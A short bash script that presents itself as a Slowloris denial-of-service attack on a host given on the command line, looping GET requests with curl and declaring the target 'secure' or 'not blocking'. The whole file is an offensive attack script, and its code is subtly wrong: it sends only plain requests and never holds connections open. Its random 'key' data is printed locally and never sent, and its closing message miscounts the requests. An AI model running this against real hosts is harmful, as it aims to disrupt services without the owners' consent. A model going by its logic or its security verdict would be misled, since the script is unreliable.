#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting Slowloris attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

echo "\n";

# make a loop to perform attack
for _ in {1..1000}
do
  TMP=$(curl -i -X GET "$HOST")
  echo Got: "$TMP"

  LC_ALL=C tr -dc '[:graph:]' </dev/urandom | head -c 1000; echo

  if [[ "$TMP" == *"400"* ]]; then
    echo "System is secure on Slowloris attack!"
    exit 1;
  fi

  echo "key"
  LC_ALL=C tr -dc '[:graph:]' </dev/urandom | head -c 10; echo

  sleep 1s;
done

echo "Sent 100 http requests on this attack!";

sleep 5s;

echo "System did not block me!";

exit 0;
